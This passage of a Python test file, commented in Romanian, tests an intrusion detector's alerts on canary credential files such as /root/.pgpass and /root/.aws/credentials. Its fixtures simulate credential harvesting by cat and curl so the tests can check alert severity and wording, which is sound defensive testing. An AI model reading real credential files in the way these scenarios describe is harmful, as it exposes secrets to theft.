    Ce se strică dacă pică: `/root/.aws/credentials` nu are niciun cititor
    instalat (verificat pe gazda incidentului: `command -v aws` nu întoarce
    nimic), deci acolo o citire chiar înseamnă că cititorul a fost adus. Dacă
    ambele momeli primesc explicația lui libpq, alerta de AWS capătă o scuză
    care nu i se aplică — exact pe dos față de defectul reparat.
    """
    pg = _bait_summary(["/root/.pgpass"],
                       proc="/usr/lib/postgresql/16/bin/psql").summary
    aws = _bait_summary(["/root/.aws/credentials"]).summary
    assert "libpq" in pg and "libpq" not in aws, \
        "explicația lui libpq nu are ce căuta pe momeala AWS"
    assert "AWS CLI" in aws and "AWS CLI" not in pg
    # Ambele citite în aceeași fereastră: gruparea e pe acțiune, nu pe fișier,
    # deci un singur rând poate purta ambele căi — și fiecare își cere nota.
    amandoua = _bait_summary(["/root/.pgpass", "/root/.aws/credentials"],
                             n=2).summary
    assert "libpq" in amandoua and "AWS CLI" in amandoua


def test_a_moved_bait_path_is_reported_as_unexplained_not_as_routine():
    """„Nu știu ce citește asta" și „e în regulă" nu au voie să arate la fel.

    Ce se strică dacă pică: instalatorul poate planta momelile pe alte căi
    (`CANARY_PGPASS_PATH`, `CANARY_AWS_CREDS_PATH` — docs/OPERARE.md §16). O
    cale pe care regula n-o recunoaște ar ieși din text fără nicio notă, iar
    operatorul ar citi asta ca pe o alertă deja explicată. Aceeași boală ca un
    check care tace fiindcă n-a putut să se uite.
    """
    s = _bait_summary(["/root/ascuns/momeala"])
    assert "nu pot spune ce cititor legitim" in s.summary
    assert "libpq" not in s.summary and "AWS CLI" not in s.summary
    # Și cazul în care colectorul n-a putut da nicio cale: tot nelămurit.
    fara_cale = _bait_summary([None])
    assert "nu pot spune ce cititor legitim" in fara_cale.summary


def test_the_repair_did_not_make_a_credential_harvest_any_quieter():
    """Un atacator cu o sesiune de administrare nu are voie să primească galben.

    Ce se strică dacă pică: reparația de mai sus e ușor de făcut greșit —
    „dacă `exe` e psql și `auid` e administrativ, coboară severitatea". Un
    atacator care a luat sesiunea operatorului rulează exact asta. Testul cere
    ca ACELAȘI proces și ACELAȘI auid ca în incidentul #487 să producă în
    continuare `critical`, și ca alerta să treacă mai departe de fereastra de
    liniște — adică reparația să fi atins doar textul, nu verdictul.
    """
    from sentinel.telegram import quiet

    cazuri = [
        # Exact incidentul #487: comandă de administrare, auid al operatorului.
        ("/root/.pgpass", "/usr/lib/postgresql/16/bin/psql", "1001"),
        # Aceeași sesiune, unealta unui atacator.
        ("/root/.pgpass", "/usr/bin/cat", "1001"),
        # Fără sesiune de autentificare în spate.
        ("/root/.aws/credentials", "/usr/bin/curl", "4294967295"),
    ]
    assert cazuri, "listă goală — testul n-ar verifica nimic"
    for path, proc, auid in cazuri:
        s = _bait_summary([path], proc=proc, auid=auid)
        assert s.severity == "critical", f"{proc} sub auid {auid} a fost înmuiat"
        assert quiet.passes_anyway(s.severity), \
            f"{proc} sub auid {auid} ar aștepta până la 06:00"


# --- ce anume s-a atins din momeală ----------------------------------------
#
# A doua reparație, 15 septembrie 2026. Testele de mai sus au oprit alerta să
# afirme cine a citit; astea o opresc să afirme CE s-a citit. Măsurat pe
# producție: toate cele 8 înregistrări SYSCALL cu `key="sentinel_bait"` erau
# `getxattr`/`lgetxattr` de la `ls`, iar alerta livrată le numea „conținutul
# deschis" și le trimitea `critical`, nesuprimate (raw_events 8824526-8824529,
# detecțiile 104014/104020). Aserțiunile sunt pe DECIZIE — clasa apelului,
# severitatea, ce regulă iese — nu pe propoziții, fiindcă o propoziție se
# reformulează și lista de propoziții interzise rămâne verde.


def test_the_measured_calls_are_classified_the_way_the_host_writes_them():
    """Un număr de syscall citit pe ABI-ul greșit înmoaie alerta pe nimic.

    Ce se strică dacă pică: 191 e `getxattr` pe x86_64 și `semctl` pe tabela
    generică. Dacă tabela s-ar aplica fără `arch`, o gazdă pe alt ABI ar primi
    „doar atributele, `low`" pentru un apel care n-are nicio legătură — adică o
    momeală deschisă ar putea ieși tăcută. Perechile de mai jos sunt cele
    măsurate în jurnalul de audit al ambelor gazde pe 15 septembrie 2026.
    """
    k = intrusion.bait_touch_kind
    assert k(X86_64, OPENAT) == intrusion.BAIT_CONTENT
    assert k(X86_64, GETXATTR) == intrusion.BAIT_ATTRIBUTE
    assert k(X86_64, LGETXATTR) == intrusion.BAIT_ATTRIBUTE
    # Fără ABI nu se decide nimic: exact starea fiecărui rând scris de
    # colectorul dinainte de schimbarea asta.
    assert k(None, GETXATTR) == intrusion.BAIT_UNKNOWN
    assert k("", GETXATTR) == intrusion.BAIT_UNKNOWN
    # Alt ABI, același număr: necunoscut, nu „atribute".
    assert k("c00000b7", GETXATTR) == intrusion.BAIT_UNKNOWN
    # Un apel pe care nu-l cunoaștem, pe ABI-ul bun: tot necunoscut.
    assert k(X86_64, "424242") == intrusion.BAIT_UNKNOWN
    assert k(X86_64, None) == intrusion.BAIT_UNKNOWN


def test_the_two_call_tables_never_claim_the_same_number():
    """Un număr în ambele tabele face ordinea dintre `if`-uri să decidă tăcut.

    Ce se strică dacă pică: cine adaugă mâine un apel în lista de atribute fără
    să-l scoată din cea de conținut nu vede nimic — clasificarea îl dă drept
    conținut fiindcă acel `if` e primul, iar lista de atribute pare că are un
    membru care nu face nimic. Aceeași boală ca două liste care divergă tăcut.
    """
    tabele = (intrusion._CONTENT_READ_SYSCALLS, intrusion._ATTRIBUTE_ONLY_SYSCALLS)
    assert all(t for t in tabele), "o tabelă goală n-ar avea ce să suprapună"
    for arch in set(tabele[0]) | set(tabele[1]):
        comun = tabele[0].get(arch, frozenset()) & tabele[1].get(arch, frozenset())
        assert not comun, f"apeluri revendicate de ambele tabele pe {arch}: {comun}"


def test_the_bait_query_asks_for_the_action_and_the_raw_keys_the_decision_needs():
    """Gruparea pe (arch, syscall) a mutat decizia într-un șir SQL neverificat.

    Ce se strică dacă pică: celelalte reguli cer acțiunea prin argument
    (`_grouped(db, cursor, (…))`), deci o greșeală acolo se vede. Aici numele
    acțiunii și cele două chei din `raw` stau în textul interogării, unde
    `_DB._pick` potrivește doar `e.source = 'auditd'` și întoarce rândurile
    pregătite oricum ar arăta restul. Trei greșeli trec astfel nevăzute prin
    toată suita: `bait_touched` scris greșit face regula să nu întoarcă
    NICIODATĂ nimic — momeala devine mută; `raw->>'arch'` scris greșit lasă
    `arch` NULL pe fiecare rând, deci fiecare atingere devine „nu știu" și
    fiecare `ls -l /root` se întoarce `critical`, adică exact defectul reparat
    de două ori; iar aliasurile schimbate între ele clasifică un `openat` drept
    pipăire de atribute și invers.

    Aserțiunile sunt pe DECIZII — ce acțiune se cere, ce cheie din `raw` ajunge
    sub ce nume, ce fereastră — nu pe textul interogării, care se reformatează
    fără să schimbe nimic.
    """
    import re as _re

    from sentinel.collectors.auditd import EMITTED_ACTIONS

    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="bait_touched", paths=["/root/.pgpass"], procs=["/usr/bin/cat"],
        users=["1001"], arch=X86_64, syscall=OPENAT)]})
    run(intrusion.bait_touched(db, 0))
    sql = db.sql[0]

    actions = set(_re.findall(r"e\.action\s*=\s*'([^']*)'", sql))
    assert actions == {"bait_touched"}, (
        f"interogarea filtrează pe alte acțiuni decât momeala: {sorted(actions)}")
    # Și că acțiunea aia e una pe care colectorul chiar o scrie: două liste ale
    # aceluiași vocabular, în două fișiere, diverg tăcut.
    assert actions <= EMITTED_ACTIONS, (
        "regula cere o acțiune pe care colectorul auditd n-o produce niciodată")

    # Fiecare cheie din `raw`, sub numele pe care îl citește `bait_touch_kind`.
    aliasuri = {alias: cheie for cheie, alias in
                _re.findall(r"e\.raw\s*->>\s*'(\w+)'[^,]*?\bAS\s+(\w+)", sql)}
    assert aliasuri == {"arch": "arch", "syscall": "syscall"}, (
        f"alt nume, altă cheie, sau schimbate între ele: {aliasuri}")
    # Fereastra e a apelantului, nu a textului: `_BAIT_SQL` o primește ca
    # argument, iar cursorul la fel.
    assert db.args[0] == (0, intrusion.WINDOW_MIN), db.args[0]


def test_an_ls_over_the_bait_is_not_reported_as_a_content_read():
    """`ls` peste `/root` trimitea un `critical` care spune că s-a citit un secret.

    Ce se strică dacă pică: e chiar ce s-a întâmplat pe producție pe 15
    septembrie 2026. Un `ls -l /root` al operatorului cere atributele extinse
    ale fiecărui nume, `-p r` prinde toată clasa READ, și alerta livrată
    anunța, `critical` și scutită de `/mute`, că fișierul de credențiale a fost
    deschis și citit. Patru rânduri, două detecții, incidentul 65237. O alertă
    care afirmă asta fără să fie adevărat le costă pe toate cele de după ea.
    """
    from sentinel.telegram import quiet

    specs = _bait_specs(["/root/.aws/credentials"], proc="/usr/bin/ls",
                        auid="1002", n=4, syscall=GETXATTR)
    assert len(specs) == 1, "o atingere de atribute nu are voie să dea două alerte"
    s = specs[0]
    assert s.rule_id == "intrusion.bait_attribute_probe", (
        "atingerea de atribute iese sub regula citirii de conținut, deci "
        "moștenește severitatea ei")
    assert s.severity != "critical"
    assert s.severity in SEVERITIES
    assert not quiet.passes_anyway(s.severity), (
        "o pipăire de atribute nu are voie să treacă de fereastra de liniște")
    # Și nu tace: rândul există, cu numărul lui și cu apelul în evidență.
    assert s.evidence["count"] == 4
    assert s.evidence["calls"] == [f"{X86_64}/{GETXATTR}"]


def test_the_attribute_alert_does_not_carry_the_reader_explanation():
    """Explicația «cine deschide legitim fișierul» lipită de un `ls` e o acuzație.

    Ce se strică dacă pică: nota despre AWS spune că pe gazdă nu există niciun
    cititor instalat care să explice o deschidere, iar verdictul comun se
    termină cu „atunci e recoltare". Amândouă sunt adevărate despre o citire de
    conținut și complet pe lângă subiect când nimeni n-a deschis nimic. Puse
    sub un `ls`, împing operatorul spre „intrus" exact în cazul în care dovada
    spune contrariul — adică afirmația scoasă din text pe 14 septembrie,
    întoarsă pe ușa din dos.
    """
    s = _bait_specs(["/root/.aws/credentials"], proc="/usr/bin/ls",
                    syscall=GETXATTR)[0]
    assert intrusion._BAIT_AWS_NOTE not in s.summary
    assert intrusion._BAIT_PGPASS_NOTE not in s.summary
    assert intrusion._BAIT_VERDICT_HARVEST not in s.summary
    assert intrusion._BAIT_VERDICT_PROWL in s.summary
    # Dar tot îi spune ce să tasteze: altfel rămâne cu un rând și nicio cale.
    assert "sentinel_bait" in _bait_command(s.summary)
    # Iar citirea reală își păstrează verdictul, altfel testul ar fi trecut
    # ștergând propoziția din amândouă.
    tare = _bait_summary(["/root/.aws/credentials"], syscall=OPENAT)
    assert intrusion._BAIT_VERDICT_HARVEST in tare.summary


def test_a_call_we_do_not_recognise_stays_critical_and_says_so():
    """„Nu știu ce a fost" nu are voie să iasă ca „doar s-a uitat la atribute".

    Ce se strică dacă pică: un apel nou, un ABI pe care tabelele nu-l cunosc,
    sau — cazul real — un rând scris de colectorul de dinainte, care n-avea
    `arch` deloc. Dacă necunoscutul ar cădea în ramura tăcută, o recoltare de
    credențiale ar deveni mai tăcută decât e azi, ceea ce e singurul lucru pe
    care reparația asta n-avea voie să-l facă. Și invers: dacă ar ieși cu
    textul tare, alerta ar afirma o deschidere pe care n-a măsurat-o.
    """
    from sentinel.telegram import quiet

    for arch, syscall in ((None, OPENAT), (X86_64, "424242")):
        s = _bait_summary(["/root/.pgpass"], arch=arch, syscall=syscall)
        assert s.rule_id == "intrusion.bait_touched", (arch, syscall)
        assert s.severity == "critical", (arch, syscall)
        assert quiet.passes_anyway(s.severity), (arch, syscall)
    # Și nu spune aceeași poveste ca pentru o deschidere dovedită: două stări
    # diferite care ies cu același text sunt o stare singură.
    nelamurit = _bait_summary(["/root/.pgpass"], arch=None, syscall=OPENAT)
    dovedit = _bait_summary(["/root/.pgpass"], arch=X86_64, syscall=OPENAT)
    assert nelamurit.title != dovedit.title
    assert nelamurit.summary != dovedit.summary


def test_a_mixed_window_does_not_let_the_noise_inflate_the_critical_one():
    """Un `ls` și o deschidere reală în aceeași fereastră sunt două fapte.

    Ce se strică dacă pică: gruparea veche era pe acțiune, deci cele patru
    atingeri de la `ls` și singura deschidere reală ieșeau ca „5 citiri" într-o
    alertă critică. Operatorul care deschide `audit.log` găsește patru
    înregistrări care nu se potrivesc cu ce i s-a spus și nu mai are cum să
    știe care e cea adevărată.
    """
    zgomot = _row(action="bait_touched", n=4, paths=["/root/.aws/credentials"],
                  procs=["/usr/bin/ls"], users=["1002"], event_ids=[11, 12, 13, 14],
                  arch=X86_64, syscall=GETXATTR)
    specs = _bait_specs(["/root/.pgpass"], proc="/usr/bin/cat", auid="1001",
                        n=1, syscall=OPENAT, extra_rows=[zgomot])
    pe_reguli = {s.rule_id: s for s in specs}
    assert set(pe_reguli) == {"intrusion.bait_touched",
                              "intrusion.bait_attribute_probe"}
    tare = pe_reguli["intrusion.bait_touched"]
    incet = pe_reguli["intrusion.bait_attribute_probe"]
    assert tare.evidence["count"] == 1, "zgomotul lui `ls` a umflat criticul"
    assert incet.evidence["count"] == 4
    assert tare.evidence["paths"] == ["/root/.pgpass"]
    assert "/usr/bin/ls" not in tare.evidence["processes"]
    assert set(tare.event_ids).isdisjoint(incet.event_ids), (
        "aceleași evenimente citate sub două alerte")
    assert tare.fingerprint != incet.fingerprint, (
        "aceeași amprentă adună cele două în același incident și îi urcă "
        "severitatea înapoi la critical")


def test_a_bait_named_credentials_elsewhere_is_not_given_the_aws_note():
    """Nota despre AWS afirmă ceva despre ce e INSTALAT pe gazdă.

    Ce se strică dacă pică: potrivirea veche era pe coada `/credentials`, deci
    orice momeală viitoare plantată sub numele ăsta — `CANARY_*_PATH` sunt
    variabile de instalator, docs/OPERARE.md §16 — primea explicația „e citit
    doar de AWS CLI/SDK, care nu e dependența nimicului de pe gazdă". Fals
    pentru un fișier care n-are nicio legătură cu AWS, și fals în direcția care
    împinge spre „intrus".
    """
    strain = _bait_summary(["/srv/app/credentials"]).summary
    assert intrusion._BAIT_AWS_NOTE not in strain
    assert "nu pot spune ce cititor legitim" in strain
    # Iar momeala adevărată își păstrează nota, altfel testul ar fi trecut
    # ștergând explicația cu totul.
    assert intrusion._BAIT_AWS_NOTE in _bait_summary(["/root/.aws/credentials"]).summary


def test_the_how_to_check_command_survives_a_log_rotation():
    """Comanda din alertă ieșea cu 0 și fără nicio linie.

    Ce se strică dacă pică: `/var/log/audit` rotește la 8 MB, adică la 8-17 ore
    pe gazda asta. Măsurat pe 15 septembrie 2026, forma pe un singur fișier
    (`… audit.log | grep SYSCALL | tail -5`) întorcea rc=0 și NIMIC: pe
    producție, toate cele 8 înregistrări SYSCALL erau în `audit.log.1`, iar
    `audit.log` n-avea niciuna. Operatorul, trimis la 3 dimineața să se uite la
    sesiune de către un `critical`, primea un ecran gol și trăgea concluzia
    greșită. Iar citirea trebuie făcută de root: directorul e `drwxr-x---`
    (măsurat pe amândouă gazdele), deci o listă de fișiere scrisă în comandă
    nici nu s-ar desface în shell-ul lui — recursia lui grep o face ca root.
    """
    import re as _re

    cmd = _bait_command(_bait_summary(["/root/.pgpass"]).summary)
    # Singura țintă de pe disc e directorul: așa ajunge la fișierele rotite
    # oricâte ar fi, fără să depindă de un glob desfăcut de altcineva.
    assert _re.findall(r"/var/log/audit\S*", cmd) == ["/var/log/audit"], (
        "comanda numește un fișier anume; după o rotație nu mai scoate nimic")
    citire = _re.search(r"\bsudo\s+grep((?:\s+-\S+)+)\s+sentinel_bait", cmd)
    assert citire, "citirea nu mai e un `sudo grep` peste cheia momelii"
    assert "r" in citire.group(1).replace("-", ""), (
        "grep nu mai intră în director, deci citește numai ce i se desface în "
        "shell-ul operatorului — adică nimic")
    assert "sort" in cmd and "tail" in cmd, (
        "comanda nu mai ordonează și nu mai taie: fie nu scoate nimic, fie "
        "scoate tot jurnalul")
    assert cmd.index("sort") < cmd.index("tail"), (
        "`tail` peste fișiere neordonate dă cele mai vechi înregistrări, nu "
        "sesiunea care tocmai a declanșat alerta")


def test_the_how_to_check_command_reaches_telegram_unchanged():
    """Comanda e singurul lucru din alertă pe care operatorul îl COPIAZĂ.

    Ce se strică dacă pică: botul trimite cu `parse_mode=HTML` și trece textul
    prin `_esc`, adică `html.escape(..., quote=True)`. O ghilimea în comandă
    ajunge la operator ca `&quot;` sau `&#x27;`, iar o comandă pe care n-o
    poate copia e o comandă pe care n-o rulează. Măsurat pe producție pe 15
    septembrie 2026: din 708 incidente notificate, `&` apare în 5 și `<`/`>` în
    2 — toate livrate — iar `'` și `"` în ZERO, deci alerta asta ar fi fost
    prima care le poartă. Dacă redarea pică, `_broadcast` prinde excepția,
    `mark_notified` nu se mai execută, iar incidentul se reîncearcă la
    nesfârșit fără să ajungă vreodată.

    Aserțiunea e pe escaper-ul REAL, nu pe o listă de caractere interzise: o
    listă rămâne verde la primul caracter la care nu s-a gândut nimeni.
    """
    from sentinel.telegram.bot import _esc

    for syscall in (OPENAT, GETXATTR):
        cmd = _bait_command(_bait_summary(["/root/.pgpass"],
                                          syscall=syscall).summary)
        assert _esc(cmd) == cmd, (
            f"comanda e rescrisă de escaper înainte de livrare: {_esc(cmd)!r}")


def test_module_load_is_its_own_rule():
    db = _DB(rows={"e.source = 'auditd'": [_row(
        action="module_load", n=1, procs=["/usr/sbin/insmod"], users=["1000"])]})
    s = run(intrusion.module_load(db, 0))[0]
    assert s.severity == "critical"
    assert "kernel" in s.title.lower()


def test_every_intrusion_rule_is_registered():
    """O regulă scrisă și neînregistrată nu rulează niciodată, în tăcere."""
    import inspect
    defined = {n for n, f in vars(intrusion).items()
               if inspect.iscoroutinefunction(f) and not n.startswith("_")}
    registered = {f.__name__ for f in intrusion.INTRUSION_RULES}
    assert defined == registered, f"neînregistrate: {defined - registered}"
